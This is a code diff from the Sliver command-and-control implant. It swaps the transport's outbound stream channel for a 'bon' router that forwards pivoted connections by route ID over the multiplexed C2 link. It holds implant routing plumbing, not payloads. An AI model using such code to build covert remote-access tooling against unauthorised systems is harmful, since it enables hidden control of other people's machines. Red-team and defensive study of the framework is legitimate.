@@ -31,6 +31,8 @@ import (
 	"sync"
 	"time"
 
+	"github.com/ilgooz/bon"
+
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/sliver/3rdparty/hashicorp/yamux"
 )
@@ -75,9 +77,11 @@ type Transport struct {
 	// Transport's other end: the C2 Server, an implant pivot, or reverse traffic.
 	// This channel is CONSUMED by the implant's routing system.
 	Inbound chan net.Conn
-	// Outbound - Streams directed at the Transport's other end. This
-	// channel is FILLED by the implant's routing system.
-	Outbound chan net.Conn
+
+	// Router - For each connection that needs to be forwarded to the other end
+	// we use the Router to connect, specify the wished route of the connection, and pipe.
+	// Therefore, here the Router is in a client position most of the time.
+	Router *bon.Bon
 }
 
 // New - Eventually, we should have all supported transport transports being
@@ -175,7 +179,6 @@ ConnLoop:
 	if t.IsMux {
 		// Inbound/outbound streams are initialized
 		t.Inbound = make(chan net.Conn, 100)
-		t.Outbound = make(chan net.Conn, 100)
 
 		t.Multiplexer, err = yamux.Server(t.conn, nil)
 		if err != nil {
@@ -186,8 +189,8 @@ ConnLoop:
 		}
 
 		// We start handling inbound/outbound streams in the background.
+		// Outbound streams, however, are drectly handled by Bon' routing handlers.
 		go t.handleInboundStreams()
-		go t.handleOutboundStreams()
 
 		// Add the C2 RPC layer on top of the first muxed stream of the comm.
 		t.C2, err = t.NewStreamC2()
@@ -223,7 +226,6 @@ func (t *Transport) StartFromConn(conn net.Conn) (err error) {
 
 	// Inbound/outbound streams are initialized
 	t.Inbound = make(chan net.Conn, 100)
-	t.Outbound = make(chan net.Conn, 100)
 
 	t.Multiplexer, err = yamux.Client(conn, nil)
 	if err != nil {
@@ -248,8 +250,8 @@ func (t *Transport) StartFromConn(conn net.Conn) (err error) {
 	// {{end}}
 
 	// Finally we handle all inbound/outbound streams in background
+	// Outbound streams, however, are drectly handled by Bon' routing handlers.
 	go t.handleInboundStreams()
-	go t.handleOutboundStreams()
 
 	return
 
@@ -397,43 +399,23 @@ func (t *Transport) handleInboundStreams() {
 	}
 }
 
-// handleOutboundStreams - The routing system populates the Outbound
-// stream channel with connections that we need to route to this
-// Transport's other end. We process/pipe these connections here.
-func (t *Transport) handleOutboundStreams() {
-
-	defer func() {
-		close(t.Outbound)
-		// {{if .Config.Debug}}
-		log.Printf("[mux] Stopped processing outbound streams: ")
-		// {{end}}
-	}()
-
+// HandleRouteStream - The transport is asked to route a stream given a route ID.
+// This function is called by Bon' routing handlers, once they have the routeID and the conn.
+func (t *Transport) HandleRouteStream(routeID uint32, src net.Conn) (err error) {
 	// {{if .Config.Debug}}
-	log.Printf("[mux] Starting outbound stream handling in background...")
+	log.Printf("[route] routing connection (ID: %d, Dest: %s)", routeID, src.RemoteAddr())
 	// {{end}}
 
-	for {
-		select {
-		case src := <-t.Outbound:
-			dst, err := t.Multiplexer.Open()
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("[mux] Error opening C2 stream: %s", err)
-				// {{end}}
-				return
-			}
-			// We pipe the output in the background, and go on with the next stream.
-			go transport(src, dst)
+	var route bon.Route = bon.Route(routeID)
+	dst, err := t.Router.Connect(route)
 
-			// {{if .Config.Debug}}
-			log.Printf("[mux] Outbound stream: muxing conn and piping")
-			// {{end}}
+	// {{if .Config.Debug}}
+	log.Printf("[mux] Outbound stream: muxing conn and piping")
+	// {{end}}
 
-		case <-t.Multiplexer.CloseChan():
-			return
-		}
-	}
+	transport(src, dst)
+	// go transport(src, dst)
+	return
 }
 
 // In case we failed to use multiplexing infrastructure, we call here
